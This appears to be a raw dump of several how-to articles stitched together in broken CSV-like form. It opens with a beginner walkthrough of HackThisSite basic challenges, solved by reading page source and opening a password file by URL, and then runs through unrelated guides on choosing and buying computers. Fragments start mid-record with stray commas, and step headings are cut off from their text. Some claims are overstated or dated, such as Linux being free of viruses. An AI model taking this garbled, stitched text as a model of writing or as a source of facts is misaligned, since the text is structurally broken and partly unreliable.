, If you’re really stumped, check out what other users have to say by checking the forums. To access the forums, you will need to look at the navigation bar on the left-hand side of the screen. You will find “Forum” under the subheading “Communicate.” You will need to make sure to sign in first before creating a new post. Just use the username and password you use for the main HTS. Basically, on this site, there is no better place to learn than with other people who have gone through the same challenges. Remember though that these people get the same questions all the time about each mission in every category, so just take your time and read what questions have been asked by other people that are just starting.


Google things—Perhaps not for this particular mission, but the first thing you will be asked by people on the forums is if you “Googled It” before you posted a question, so make sure that you do.

, Right-click on the web page, anywhere will do, and click the “View page source” option. Some browsers might say “View source.” A new page should open. It may look like a bunch of randomness, but it's not. The password is contained inside this code, in plain sight. If you would like to jump straight to the password, copy the last few words of the story just above the password field. In this case its, “Enter the password and you can continue.”


Hold down Ctrl on your keyboard and hit the F key to start a word search of the code. Then paste the sentence above in it and hit Enter. The page should jump right to that sentence in the code, and the password is right below it. It should say something like “the first few levels are extremely easy: password is f0d0751f.” Copy the “f0d0751f,” or whatever yours says, and paste in inside the password field on the Basic Mission 1 page.
Click the “Submit” button to continue. You just finished Mission 1. A new page should load that says “Congratulations, you completed basic 1!” Click the blue “Next Challenge” button down and to the right of this box.

, From this point on, there is going to be a little story that the site creators made specifically for these challenges. Make sure to read this small little paragraph of a story on each one because these will contain clues for each challenge. This challenge is actually much easier in some ways. Please make sure to read the story paragraph above the password field.

, One of the basic steps that you should get used to is checking the HTS forums, and Googling everything. As soon as you think you have hit the end of your guesses and solve attempts, go to the forums. These people have been here for years, and they are more than willing to help people understand difficult subjects. In addition, they are usually pretty good about not giving the answers right away and actually helping people to learn the concepts behind these missions.


Although many of these people will be nice and friendly, please note that not all will be nice to you. There also may be some who may just drop the answer right away. Please try to remember that you are here to learn these concepts, not just get the answers.

, If you haven’t figured it out on your own yet, you are probably going to come to this step completely confused. That’s all right. Let’s break it down. The paragraph says “Network Security Sam set up a password protection script. He made it load the real password from an unencrypted text file and compare it to the password the user enters. However, he neglected to upload the password file…” The last sentence is the most important in this case. If there was no password file loaded, then there is no password. Thats right! Just click the submit button and you have beaten the second mission. Click the blue “Next Challenge” button to continue.

, That last mission should give you an idea about what you need to do sometimes in order to get through a mission. Sometimes you need to be able to click buttons and see the results, because sometimes people make mistakes. This mission, however, becomes the most complicated so far because it goes back into the HTML coding of the site, and the story isn’t of much help. Make sure that you take a moment to try and figure each of these challenges out on your own though. When you are stumped, continue to the next step.

, Once you are on the Mission 3 page and have exhausted yourself, right-click the web page and click “View source” or “View page source,” depending on your browser, to view the HTML for the page.

, As you look at the code in front of you, you may be a bit confused. That’s all right; everyone is at first. Dive down to the part of the code that contains the part of the HTML with your password field and story in it. You can do this by copying the last sentence of the story presented, then holding down the Ctrl button on your keyboard and hitting the F key. This will open a search box in the upper right-hand corner of the page. You are then going to right-click inside that box and select “Paste” from the context menu given. You should automatically be taken to the part of the code that contains our password field.

, As you look at the code, you may notice that there are actually different types of codes being used and referenced. This is because HTML works alongside many different coding languages to accomplish different things. For instance, PHP. PHP is what is called a server-side scripting language. A programmer can run scripts with PHP that would otherwise be too difficult, or impossible, to accomplish with HTML alone.


A few good resources to understanding a programming language, like PHP, online would be CodeCademy and 3WSchools. It is important to research as you are going through different challenges to learn more about the obstacles in your path. These sites can help you learn a bit about PHP, as it will come up in future challenges.

, Open up the source for Mission One in a tab and then view Mission 3’s sources code in another; you should try to compare the two. Try to spot the changes. You may first noticed that the way the code is formatted has changed. In addition, there seems to be a new file type that has been inserted. This is the line of code you are looking for: “<input type=""hidden"" name=""file"" value=""password.php"" />”. This shows us something interesting. Network Security Sam has placed the password we are looking for inside a PHP file called “password.php.” Since web browsers like Chrome or Firefox are built to automatically read PHP and other web-based languages, you should be able to read this file.


If you look at the line just above the one that lists the PHP file you should see: “<form action=""/missions/basic/3/index.php"" method=""post"">”. If you go back to your main basic Mission 3 page and look at the current URL, it should read something like https://www.hackthissite.org/missions/basic/3/, but notice that there is no “index.php” on the end. This means that the website is waiting for a specific action to happen before i starts reading index.php file. The same is true for the “password.php” file. The website is waiting for whoever is typing in the password field to hit the “Submit” button before it reads the password.php file, but you can read it first. Try to figure the rest out then go to the next step.

, If you still haven’t figured it out on your own, go to the main Basic Mission 3 page. Once you are there, up in the URL add “password.php” to the end of it. It should look like this: https://www.hackthissite.org/missions/basic/3/password.php. Now hit Enter. The browser you are using should be able to read the PHP file and display what is inside. In this case, there should be a random number-letter sequence in the upper left-hand corner. Copy and paste this in the password field for Basic Mission 3 and hit “Submit.” You have now completed Basic Mission 3 from HTS.

",How to Choose Your First Computer," Think about how much money you are willing to pay for a computer.;
, If it is for basic applications like word processing, then look for a cheap model. If you want to play games, you'll need something with a fast processor, lots of RAM, a large hard drive, and good sound and graphics cards.

, If you need to take it all over the place, you'll need a laptop. If you intend to leave it in the office or at home on the desk, then buy a desktop.

, If it's for an office and you have to share it, you might need one with more memory and Windows 7 Professional or Ubuntu. If you will be the only one using it, and mostly for playing games, then Windows 7 Home Premium or Vista Home Basic will serve you well.

,



Linux (Ubuntu, Debian, Fedora, OpenSuse and Mandriva) is stable, fast and free.

Microsoft Windows (98, XP, Vista, 7, 8) is the most popular platform in general and for gaming.

Mac OS X (Tiger, Leopard, Snow Leopard) is popular for creative endeavours and multimedia.

, Decide whether you want a desktop machine, a laptop that you can take with you, or a netbook. A netbook is a smaller version of the laptop but more portable and with fewer built-in devices such as CD and DVD drives.

, Decide how much RAM memory you want your computer to have. Many software have a minimum RAM requirement in order to run. So if your software say it requires 2 GB of memory, and your computer has only one GB of memory, it will not run. The more RAM the better, but it will be more expensive. You should at least have 2 GB or more RAM, unless the only thing you are using the computer for is connecting to the internet (in which case you can do with only 1 GB).

, Scan the Internet, and become more knowledgeable. Compare prices, and whether the computer can be upgraded as needed. Then you are ready to order, either online, or in a computer store.

Decide what you want to do with your computer.,
Remember that there are no limits.,
Be aware of any hurdles you may encounter.,
Research the nuances of each platform.",How to Choose Between an Apple Macintosh and Other PCs," All computers and platforms will function well for casual computing, including web browsing, document manipulation, scheduling and management, and multimedia playback. However, there are some platforms which excel in specific areas:


Games. Many games are available for both Macs and Windows PCs, but this is one area where things are greatly skewed. If hardcore, cutting-edge gaming is one of your primary reasons for buying a computer, a Windows PC is advisable. The library of games available for the PC is exhaustive, and hardware specifically tweaked for gaming performance is much more readily available for Windows. Some of the more popular titles are released much later, if at all, for the Mac. There is no native DirectX support in Mac OS and Linux, although there are compatibility layers such as Wine and Cedega. If you're looking for a computer to play games on, focus on a PC. The array of graphics cards and upgradability also favor Windows-based computers.

Home Office. Microsoft's ubiquitous Office suite is available on both platforms, although with slightly different offerings, notably, the Access database module is absent from the Mac version. Apple has recently released iWork '09, which currently consists of an MS Office-compatible word processor called Pages, a spreadsheet application called Numbers, and presentation software called Keynote. A large number people regard Keynote as being far superior to PowerPoint for quality presentations. Beyond that, there are a plethora of third-party solutions for both systems such as the free OpenOffice.org software, as well as Sun's Star Office. Microsoft Office 2007 can be installed on Linux too.
Content Creation. Although Windows plays host to a score of Adobe's multimedia content creation software, the Mac has been home to these applications for a long time. Many professionals who need to create studio-quality content will opt for MacOS because of both its history and community involved in this field of work. The Mac has been long touted as an artist's choice. Even though this does not necessarily address the hardware or software differences of the platforms (there are little, if any at all), it does generate ""buzz"" that helps drive and market the Mac to professional studios. In turn, it generates a community of professionals willing to help each other with software tips and techniques. For instance, most Hollywood movie special effects are created on the Macintosh platform, including Pixar's successful computer-generated movies.;
, Learn the strengths of each platform. Any specific computer system that is sold as a PC, no longer has the same limitations of PCs decades ago. It is easy to be ensnared in this thought process, especially when fans of each platform emphasize specific strengths. There is no such thing as the best platform overall; there are only best platforms for each individual and their intended use. Strengths of each platform will help guide you to understand what best suits your needs.


Apple Mac: Historically known as an easy to use platform with powerful multimedia applications. These are no longer a Mac's primary strengths, due to recent changes in computer hardware and software. Instead, the Mac's strengths are focused on a no-fuss, pre-configured and pre-installed system with a variety of software and utilities to get even the most computer-illiterate users up and running in a minimal amount of time, with good user support. Apple laptops are also know for their sleek designs and attractive looks. Apple has been consistently ranked number one in product reliability and customer support by Consumer Reports, and for good reason. Since Apple designs the Operating System and controls all hardware configurations the end result is increased reliability and product support. Apple also has its customer support center based in the United States, unlike many other manufacturers who have outsourced customer support to other countries.
Pre-built PC: Many people run Windows because it's what they know, and what their schools, offices, and friends use. Some pre-built PCs are now shipping with Ubuntu or other Linux distributions. The strength of pre-built PCs is that you receive a pre-configured and pre-installed system that is ready to install most third-party software and be compatible with a majority of other computers in existence.
Custom-built PC: Sometimes viewed with a bad reputation, or viewed as an option that is 'just for computer geeks', custom-built PCs don't receive the proper respect or consideration when new computer users make a purchasing decision. Despite their reputation for high-end, specialized systems, opting for a custom-built PC to run Linux, Windows, or MacOS can be a frugal and rewarding choice. The strengths of a custom built PC are focused on price, performance, and freedom.

, PCs of each platform have strengths, but they also have weaknesses that may hinder your goals and desired usage. No computer is perfect, and the same concept applies to all platforms.


Apple Mac: Weaknesses focus on price and compatibility. Apple desktops and laptops are very expensive when compared to other PCs. They are also very proprietary in regards to their hardware, software, and software licensing even though they're based upon an open source BSD kernel (Darwin). This brings a higher cost of hardware and services, resulting in a higher ownership cost. Though it should be noted that the average Macintosh user is more inclined (and more able) to keep a computer system for a longer period of time, resulting in lower average ownership cost.
Pre-built PC: Similar to a Mac, except without the price downside, and sometimes less proprietary hardware. Some manufacturers such as Dell and HP/Compaq will sell models that are very proprietary (power connection, motherboard size, system layout, etc.), yet others may adhere to component standards used throughout the PC industry. It varies by each manufacturer and their model. This in itself is a weakness. Also, Windows licensing has become extremely restrictive with Vista, and support for these consumer-level pre-built systems is questionable at best - many peripheral devices (printers, scanners, etc.) that worked with older systems no longer work with a Vista-running computer.
Custom-built PC: A weakness associated with custom-built PCs is that they are less user-friendly for new computer users. This may be offset with the help of friends and acquaintances who are able to build the system and offer advice. Yet, there is no denying that a PC built from individual parts requires a good deal of research and a high learning curve for non-technical users.

, Every PC and operating system has its share of individual quirks or benefits that are sometimes passed up as 'trivial' or insignificant. However, these nuances can translate into a world of differences for specific users. Below are individual features, aspects, and even models to provide a glimpse of each platform's individual features.


Apple Mac
Mac laptop (called MacBooks) trackpads has only one ""mouse button"", but you can do right clicks by tapping the trackpad with two fingers. Apple's current line of laptops allow you to right click by clicking the right-hand side of the trackpad/button. Connecting a regular 2, 3, or multi-button mouse will get past this limitation. Apple's 'Mighty Mouse' has been adopted as a Macintosh multi-button mouse, with a multi-directional scroll wheel, which comes included with the iMac (Mac Desktop computer).
An iMac is an all-in-one desktop computer, built behind a widescreen monitor. It includes built-in Bluetooth, wireless connectivity, speakers, a microphone, and a web cam. The power cable is essentially all that is required to run the computer. An iMac has a limited upgrade path, that my result in purchasing a new computer to perform an upgrade.
MacOS can be more secure than Windows since it's not often a target of virus and malware developers. This is mostly because it isn't cost effective for virus writers to target Macs, because Macs have a smaller share of the PC market. Mac is also built upon a BSD kernel (Darwin), which helps boost its stability and decrease its susceptibility to existing viruses.
The most powerful (and most customizable) Macintosh is currently the Mac Pro. It supports up to 2 quad-core 3.2 GHz Intel processors, for a total of 8 cores, up to 32 GB of 800 MHz DDR2 RAM, 4 1-TB SATA hard drives for a total of 4 TB of storage space, either up to 4 ATI Radeon 256 MB HD 2600 XT graphics cards which can support 2 additional 30-inch Apple Cinema Displays per card or one 1.5 GB NVIDIA Quadro FX 5600 graphics card, and 2 16x SuperDrives for the ultimate computing experience in gaming, design, video making, programming, server hosting, 3D rendering, and productivity.


Pre-built PC:
It is possible to get an all-in-one designed PC. Some examples include the Gateway ONE, the Dell XPS One.
There has not yet been a single widespread Linux malware threat of the type that Microsoft Windows software currently faces; this is commonly attributed to the malware's lack of root access and fast updates to most Linux vulnerabilities. Windows systems have the widest and best selection of anti-virus and anti-malware software available to them. This doesn't necessarily make the operating system any more secure than other platforms, but it does offer some of the best detection algorithms and scanning throughput performance of all other platforms. Where there is a need, there's a solution. Windows systems are frequently targeted by virus and malware developers, so third parties and stepped up to confront this weakness with powerful applications.


Custom-built PC:
A common misconception is that PCs are sold in drab, plain looking cases. In fact, there is a striving community of people who enjoy modifying PC cases, resulting in fantastic computers. These ""mods"" can be anything from a paint job, to gutting and cutting an existing case, or even fabricating an entirely new case. This is as much an endeavor for better cooling, faster speeds, and quieter PCs, as it is purely for artistic and aesthetic value.
Linux can be used with either a PC setup or a Mac and can be bought pre-installed from Dell online with Ubuntu Linux. Linux has much lower system requirements then Mac or Windows and is totally free and open source, because of this there are several versions of Linux to choose from. Linux can be used on just about any processor platform from x86 to the old PowerPC based Macs. The only problem is that if you don't know how to use the console in Linux (inputting commands, somewhat similar to MSDOS, or Unix startup in Mac) you will be missing out on a portion of what Linux has to offer.
Linux also is compatible with many Windows (and Mac) applications via software such as Wine and Crossover Office, and can emulate MacOS X with different software. Linux and Macs are both UNIX-based, so they can share some of the same codebase, making them both reliable options.

Choose your processor.,
Choose a gaming motherboard.,
Beef up your RAM.,
Buy a good graphics card.,
Choose a high-wattage power supply.,
Select the proper casing.,
Complete your gaming PC with accessories.",How to Choose Parts for a Gaming PC," Just like any electronic device, the processor is the brain of a gaming PC. Therefore, it’s essential that you pick the right one.


The two most common processors used in PCs are Intel and AMD, each having an array of model to choose from.
As a rule of thumb, the more cores a processor has, the better performance it can give.
Good gaming processors range from $200 up to $1000.;
, If the processor acts as the brain, the motherboard serves as its nervous system, distributing all the commands the processor sends to all the components.


To ensure fast response rate, a motherboard should be able to handle the load of the games being played.
You can buy a good motherboard starting around $100.
Common motherboard brands are ASUS, MSI and Gigabyte.

, Video games require intense memory processing. That’s why in order to help your processor do the work, you need a considerably large RAM module.


Typical RAM capacity for gaming PC is around 4 GB to 16 GB. Check your owner’s manual to know what frequency of RAM/Memory module is compatible with your motherboard.
RAM modules costs around $20 a piece, depending on its size.

, Since everything about gaming is visual, a high-performance graphics card is a must. The higher the capacity of the card, the better the visual it can produce.


Video cards, just like RAM modules, vary in sizes. Intense gaming graphics require at least 1 GB of video memory to produce at least an acceptable display.
You can buy a decent, mid-level graphics card for at least $100, but the high-end ones will cost you at least $500-$1,000.
Common video cards used for gaming PCs are NVidia and ATI, each have its own various models you can choose from.

, PC peripherals designed for gaming requires a lot of power to do all the important processes. Choosing a high-wattage power supply will ensure your rig gets the right amount of electricity it needs to run.


Mid-range gaming PCs will need around 500 watts while high-performance ones can eat power up to 1,000 watts.
Prices of power supplies depend on the wattage rating. You can buy a 500-watt PSU for around $50 to $200.

, Because a gaming PC needs a lot of power to work, it will tend to generate large amount of heat. Choosing the right CPU tower/casing will prevent your rig from overheating.


Decent cases start from $50.
You can also attach fans or water-cooling systems to help improve the ventilation system.

, Large display monitors, gaming mice and keyboard, and headsets are the common accessories you’ll need with your gaming PC.


Although these items are not completely necessary, it adds to the overall gaming experience and performance of the rig.

",How to Choose Keyboards for Computers,"


At the back of the computer, you'll see either a round port, which is a PS2 port, or a rectangle one, which is a USB port. The type of port you have determines the type of connection your keyboard must have in order to function.
You can also choose a wireless computer keyboard if your computer has Bluetooth capabilities. To find out if it does, go to the control panel on your computer and search for the icon that says ""Bluetooth Devices."" If you find the icon, you can simply add hardware such as a wireless keyboard by clicking on the ""Add"" button and following the instructions in the pop-up windows.;
,


Standard keyboards, also referred to as ""QWERTY"" keyboards because those letters are the first 6 on the left on the top row of letters, consist of the letters of the alphabet with the numbers 1 to 0 above them, punctuation symbols, a numeric keypad to the right, and a range of function keys. These keyboards are best for regular computer use that only requires typing and standard shortcuts for computer functions and commands.
Ergonomic computer keyboards are specifically designed to minimize muscle strain and other musculoskeletal problems such as Repetitive Strain Syndrome (RSI) that can be the result of long hours at the keyboard. Their keys are positioned to follow the form of your hands and there's a large pad to support your palms and wrists at the bottom of the keyboard.
Gaming keyboards are like standard keyboards with additional features and functions. They have illuminated keys for playing at night, multimedia keys to adjust the volume, palm rests to minimize the strain on your hands, and shortcuts so you can check mail and do other things while still playing computer games.
Laser or infrared keyboards are still in the beginning phase of development and aren't very user-friendly yet. A small device projects a keyboard onto your desk, and you type directly onto the desk. Though this may be useful once perfected, at this time their usefulness is limited as they don't function as well as standard keyboards.
If you travel a lot, a roll up keyboard may be useful. This is made of polyurethane or silicone, and allows the user to simply roll the keyboard up after each use.

, If you want a keyboard that has a different type of connection from your computer, buy an adapter for the ports.

, When you buy a keyboard, it might come with software you need to install in order to use special function keys. Check that the operating system on your computer meets the software's requirements.

How much time are you willing to spend?,
How much money are you willing to spend?,
What type of machine are you looking to get?",How to Choose Between Buying or Building a Computer," If you are not comfortable at all with working with electronics or the inside of computers, building a computer may not be for you. However, if you like the prospect of ""doing it yourself"" then you may want to consider building your next computer.;
, Building a computer can be time consuming, not just in the actual building of the machine, but the amount of time it will take to research and pick the components you wish to include in your new machine. Also consider the time it takes for components to arrive if using mail-order or buying off the internet, as well as the time it would take to install and setup all the software, which is usually done for you one fully complete systems. As oppose to buying a computer, you'll have a complete, fully working system that should be ready to go right out of the box.

, Building a computer may not always be less expensive than buying one, especially if you also need to buy an operating system and other software along with the hardware. If you are truly on a tight budget, it may be worth researching what kinds of deals are available on complete systems. Also consider what you may already have available, such as do you already have a nice monitor and keyboard you can use? Could you also reuse your hard drive? Do you already have a copy of the operating system and other necessary software that you can reuse on a new machine? These are factors to take into consideration if you want to build a machine versus just buying a new one.

, First and foremost, if you are looking to get an Apple Macintosh, the decision to build versus buy is virtually already made. The only way to get a Macintosh is to buy one through Apple or any of their retailers, as the only way to build a Mac from the ground up is very technical, and also illegal. Beyond that, do you just need a machine to surf the web and/or do office productivity type of tasks or do you want to get a fully customized high-end gaming rig? As you move into the higher-end of PCs, building the machine instead of buying one makes more sense, especially as building your own machines affords you the luxury of being able to pick exactly what you want to go in your new machine. Also, are you looking to get a laptop versus a desktop? Although it may be possible, but it is much more difficult to build a laptop and often more expensive, then simply to buy one.

Will you be using the computer mainly to check email and browse the web?

Are you planning on doing a significant amount of office work on your computer?



 


Do you enjoy games and plan on spending most of your computer time playing the latest and greatest releases?






Are you an artist or musician? Do you anticipate using the computer to create images, music, or videos?






Is your computer going to be used by everyone in the family? Is your computer going to be an entertainment hub for the living room?





;
, Laptops are portable, and are great for students or office workers, but they are typically less than stellar when it comes to gaming. Desktops are typically much more powerful than laptops, but can also end up more expensive. They also take up significantly more space than a laptop.


Ask yourself how tied down you want to be to a desk. Laptops will allow you to work from virtually anywhere that you can charge or get a Wi-Fi internet connection.






If choosing a laptop, pay attention to the advertised battery life, as your battery will dictate how mobile your laptop can be.







, A lot of this comes down to personal preference. If your business runs mainly Mac computers, having a Mac at home can make work more convenient. Apple computers are typically more expensive than an equally powerful Windows PC, and Windows PCs can run way more games than an Apple computer (though more and more games are coming out for Mac as well). Although these are the most commonly available choices, you can save money by going with a Linux distribution like Ubuntu.


Apple computers are preferred for musicians and artists, as they typically run content creation programs much more efficiently than a Windows PC.

Linux is an alternate Operating System that is free from costs, copyrights, and viruses. If you are buying a computer with Linux, look out for a System76. Ubuntu is a good distribution to start with.


, Net-books can be found for less than $200, while high-end gaming and graphics-processing computers can run into the $2000 range. Balance your needs versus your available budget.

, When it comes time to start shopping around, it will be useful to know what the basic pieces are so that you can make good comparisons.

Hard disk – This is the storage for your computer. Storage is measured in gigabytes (GB). All of your documents, programs, photos, videos, and music will use this space. In general, the more storage, the better, though average users can easily get by with 500 GB.






RAM/Memory – This is specialized storage that programs use to keep temporary information. If you don’t have enough RAM, you’ll find programs running sluggishly or even crashing. 4 GB is a good baseline number for RAM, though gamers and graphics designers will want at least double that.






CPU – This is the computer’s processor, and what makes your computer run. There are two major manufacturers – Intel and AMD. AMD is typically a little cheaper than Intel for comparable performance, at the cost of some quality and support. Be sure to research which CPU you are planning to purchase, as the market changes frequently.






Video card – If you aren’t running games or doing 3D development, you most likely won’t need to worry about your graphics card. If you’re a gaming enthusiast, however, then the video card is a crucial component of the computer.







, One of the oldest traditions in the computer world is building your own machine. Desktops are modular and are designed to be easily constructed and upgraded. Building your own desktop can also be significantly cheaper than buying a prebuilt computer. The drawback is the lack of support for your computer; all replacements and technical issues will have to be handled by yourself.

, If building your own computer seems a little intimidating, you can find prebuilt machines from all of the major manufacturers. Make sure to compare specifications across brands, and to avoid computers that have for more features than you’ll ever use. On the flip-side, don’t buy a computer just because it is cheap, make sure that it has the features that you need.

Popular desktop manufacturers include: HP, iBuyPower, Acer, Dell, Lenovo, Gateway, and more.






Apple desktops run Mac OS X instead of Windows, and are often much less customizable or upgradable. The upside is their unified hardware means programs designed for much typically run much more efficiently, and OS X has to worry less about viruses. Linux computers such as the System76 are cheap and do not get viruses. Although, a Linux computer may not have many applications. But, there are equivalents that work just as well.


, If you’ve decided to build your own computer, you will need to purchase each of the components individually. Shop around to ensure that you’re getting the best price, but also ensure that the retailer you are purchasing from, has a good return policy in case anything arrives broken (which is fairly common in the computer industry!!). A good site to shop for individual parts is Newegg.com. Once you’ve got your parts, check out this guide on putting it all together.

, Since laptops cannot be easily built, you will have to choose between options made by the manufacturers. Compare not only features but the support offered by the manufacturer. Be sure to read online reviews about the customer support and return services that they provide.

, Laptops are much more difficult to upgrade than desktops, impossible in most cases. If you are getting a laptop, you really need to be sure that you are happy with its performance and the specifications. Upgrading the hard drive is usually no problem, but changing the video card is close to impossible and changing the processor is out of the question.

, If possible find a place that will let your give your laptop a test drive before you lay down your hard-earned money on it. If you can’t give the laptop a try, try to find a few reliable reviews online.

Verify that an installation disc is provided with the used Apple computer.,
Look specifically for a refurbished Apple computer.,
Determine the history of the used computer.,
Ask the current owner why they are selling the computer.",How to Buy Used Apple Computers1," You may want to buy a used Apple computer in decent physical condition that is not currently in disrepair, and that does not contain excessive signs of wear.


If you are buying a laptop, examine the keys and trackpad for signs of fading or rubbed away letters, numbers, and symbols, which can indicate excessive use.;
, You may not want to purchase a used Apple computer running on an outdated operating system, unless it has enough memory to support an upgraded operating system.


If upgrading the operating system is required, verify that the computer's hardware can handle the upgrade in terms of memory and processing speed. For example, if at least 2 additional gigabytes (GB) of memory are required to run a newer operating system, verify that you can install at least 2 GB of memory on the machine.

, The installation disc is necessary if for some reason you need to reinstall the Apple's operating system and software.

, Although refurbished computers may have been returned to the manufacturer at one point, Apple technicians have either repaired the computers, replaced non-working parts, or upgraded the computer to return it to a fully operational state.

, You may want to buy a used computer that has only had 1 previous owner, or that has not been moved frequently between locations.

, There may be no issues with the computer if the owner is upgrading to a newer model; however, if they are selling the computer because it frequently experienced issues, you may not want to buy that particular computer.

Determine what you need in the way of features on an off lease laptop or desktop computer.,
Identify sellers with a reputation for having strict standards when it comes to re-certifying an off lease computer.,
Consider features such as the amount of RAM and ROM included in the system, the type of operating system that is loaded onto the hard drive, and the inclusion of equipment such as built-in speakers or cameras.,
Research the background of off lease computers offered by each seller on your list.,
Determine if any type of warranty plans are included with the purchase.,
Compare prices between several different systems that meet your needs.",How to Buy off Lease Computers," This includes the amount of memory you need on a hard drive to make use of the software you plan on using, the ability of the system to support use of a high speed Internet connection and even the inclusion of hardware for saving and retrieving information from your recordable CDs(CD-R) and old floppy disks.;
, This will help prevent you from getting involved with any seller who offers units that have been subjected to anything more than a cursory inspection and increase the chances of purchasing a system that will last for several years.

, Even something as simple as the number of USB ports should be considered as part of the evaluation. Actively look for features above and beyond the ones you consider essential and determine if those other features could possibly be useful at some point.

, Use online and offline sources to gather information from past buyers with a focus on how easily the purchases were made and how the units performed once they had been purchased. This will help you determine if what you hear about those strict re-certification standards are actually true.

, Some off lease computers will come with a basic warranty that is good for anywhere from a few months to a calendar year from the date of purchase. Take the time to look closely at the terms of those warranties and identify the ones that offer the greatest level of protection during the warranty period.

, Buying off lease is about acquiring the best laptop or desktop for the most competitive price. Settle on the computer that has all the features you want, comes with some type of warranty that you find acceptable and has the best price.

Consider whether you want a desktop or laptop computer.,
Determine what you're going to use the computer for.,
Decide how much you're willing to spend and on what.,
Look for reputable manufacturers of computer components.,
Look for a reputable computer assembler.",How to Buy an Assembled PC," If you like to work from a number of locations in your house or outside of it, you'll want a laptop computer. If you prefer to work from a dedicated office inside your home or at a remote location, you'll want a desktop computer. Presently, assembled PCs are more likely to be desktop computers than laptop computers, but the increasing popularity of laptops and wireless Internet connections is causing more assembled laptop PCs to be built than previously.


If you divide your time between working in 1 location and working remotely, you may want to consider one of these options: If you spend more of your time at home than working remotely, you may want to have both a desktop computer and a laptop computer, with the desktop being an assembled PC and the laptop a branded PC. If you spend more time working remotely than at home, you may want to have a laptop with a docking station in your home office to plug the laptop into so you can use it with a desktop-style keyboard and monitor.;
, You can use either a branded PC or an assembled PC for most all-around needs. If you have specific needs for which you're buying a computer, you may want to buy an assembled PC, as you can have the computer built to your specifications.


For playing video games, you'll want the fastest processor and the most random access memory (RAM) you can get, a fast hard drive, and the best graphics card you can afford. You may want to have multiple graphics cards, which will require additional expansion slots and a bigger power supply.
For digital editing of photographs and videos, you'll want a high-capacity hard drive, a fast processor, and a good graphics card. If you plan to connect the computer to your TV set to view your digital images, you'll want to have the computer equipped with the same type of connectors (S-video, DVI, or HDMI) that your TV has. For video editing, you'll also need either a USB or Firewire port to connect a video camera to your computer and a quality sound card.
For a home recording studio, you'll want a high-quality sound card, a fast processor, and a high-capacity hard drive to handle the sound files you create. You'll also want to have a MIDI connector if you plan to connect the computer to a MIDI keyboard.
For running a home business, the ideal configuration depends on the kind of business you run. For a graphic design business, you'll want a quality graphics card and a large monitor. For a business that requires you to run a number of software applications at once, you'll want a fast processor and hard drive. You may also want a large monitor if you keep a number of screens open at once or spend most of your time in front of the display.

, Assembled PCs often run cheaper than branded PCs, in part because they don't come loaded with software you won't use. However, depending on how you configure an assembled PC, it can cost as much or more than a branded PC of equal processing power. The main costs come from the speed of the processor, the storage capacity and speed of the hard drive, how many slots the motherboard includes, and how many of them are filled with memory, sound, or graphics cards.


The faster the processor you buy, the faster your computer runs the software on it, but also the more cost it adds to your computer system. Faster processors now feature multiple processing cores (dual-core, quad-core, 6-core, and 8-core).
The larger the capacity of your hard drive, the more data (documents, images, sound files) you can store on it and the faster its retrieval speed in revolutions per minute, the sooner you can start working with your data. Hard drives are increasingly being made with a speed of 7,200 rpm, with older drives operating at 5,400 rpm. The fastest hard drives are solid-state drives, which have no moving parts, but these cost a good bit more than other hard drives.
The motherboard holds the processor, memory boards, and other peripheral cards. It should be compatible with the processor you buy and have enough expansion slots to upgrade the computer as you see fit. It should also have enough connection ports to your peripherals, at least 2 or 3 USB ports, and connectors for a TV, MIDI keyboard, or video camera as needed.
Dedicated sound and graphics cards have their own processing chips, allowing them to produce better sounds and image displays than memory chips within the computer's motherboard.
Memory comes relatively cheap, but it is important. The more memory you have, the more applications you can run at once, and the better your computer will perform overall. Be sure you get enough memory to run your computer's operating system; in general, the more recent the operating system, the more it can do and the more memory you'll need. You can buy an assembled PC with plenty of available memory card slots with the intent to upgrade later, but it may be better in the long run to buy the additional memory before you need it.

, The advantage of buying an assembled PC over a branded PC is that you can choose which components you have installed in your computer when you buy it. The disadvantage is that you have to become knowledgeable about the manufacturers of components instead of looking for a familiar brand name for the computer. You can research component manufacturers on the Internet or by asking around at computer stores or by asking other computer users.


The 2 main processor manufacturers are AMD (maker of the Athlon chip) and Intel (makers of the i, T, and G series chips and best known for the Pentium and Celeron chips). Some processors have a reputation for running hotter than others, requiring more and bigger fans to keep the processor from overheating.
Reputable hard drive manufacturers include Seagate, Western Digital, and Iomega.

, You can build a personal computer yourself by ordering the components from distributors, but most buyers of assembled PCs prefer to have someone else assemble the computer for them. You can either deal with a computer manufacturer who assembles PCs to order and sells them over the Internet, or you can buy from a local computer assembler.


Buying direct from a manufacturer may offer you the comfort of a brand name for your personal computer while still having a choice in the components that are used in it. However, your choices can be limited to a narrow range of processors, hard drives, or other components that may be what the manufacturer got a good deal on at the time and may or may not meet your needs. Also, you may have to send the computer back to the manufacturer or to another servicer if the computer needs servicing while under warranty.
Buying from a local assembler lets you ask questions directly of the company, choose from a broader range of components, and, in most cases, have local access to service and support if you have problems with your computer. You can also upgrade your computer more easily, usually without worrying about whether a hardware or operating system upgrade will void your warranty.
You can vet the quality of a computer assembler by getting a list of that assembler's customers and interviewing them at random, as well as searching Internet websites and forums. You want an assembler with an established track record, decent warranties, and excellent technical support.

Consider the advantages of purchasing a barebones system.,
Consider the disadvantages of purchasing a barebones system.",How to Buy Computers Without an Operating System1," Building a barebones system can be a cost effective option, allowing more advanced users to save 30 to 50 percent over the cost of a pre-assembled system. A barebones system can be customized to suit your specific needs. This method is a good option for those who wish to avoid the proprietorial restrictions computer manufacturers place on service contracts.;
, Building a barebones system requires a certain level of expertise, exceeding that of the average user. The typical barebones system may only include a power supply, motherboard and case. Various components will have to be installed, such as an optical drive, RAM memory, video cards, audio cards and hard drives.


Remember that, typically, no technical support contract or warranty will be included with the purchase of a barebones system. Additionally, no operating system or software bundle will be included, which can raise the price of a barebones system to exceed that of a pre-assembled system. Keep in mind the price issue can be completely resolved if you use Linux.

"
"
Choose the configuration that makes the most sense for your particular situation.,
Evaluate the compatibility.",How to Buy Computers Without an Operating System2," Several manufacturers offer barebones systems. An Internet search using the key word phrase ""buy barebones system"" will produce a list of retailers offering a variety of different configurations.

, Pay particular attention to the motherboard installed and double-check to ensure that it is compatible with the components you wish to use to complete your system, such as RAM memory, video cards and hard drives.


Take note of the size of the computer case and confirm that it will accommodate the components you plan to install on the system.
Check the number of RAM memory slots to confirm that there are enough to accommodate the amount of RAM you wish to install.
Confirm that the motherboard has a PCI-E slot installed if you plan to install a PCI-E video card.
Take an inventory of the available ports, such as USB, Firewire and Ethernet ports, to confirm that the barebones system will accommodate the number of peripheral devices you plan to connect.

Replace an existing operating system on a pre-assembled system.",How to Buy Computers Without an Operating System3," An external hard drive can be purchased and connected with a USB cable, eliminating the need to open the computer case.


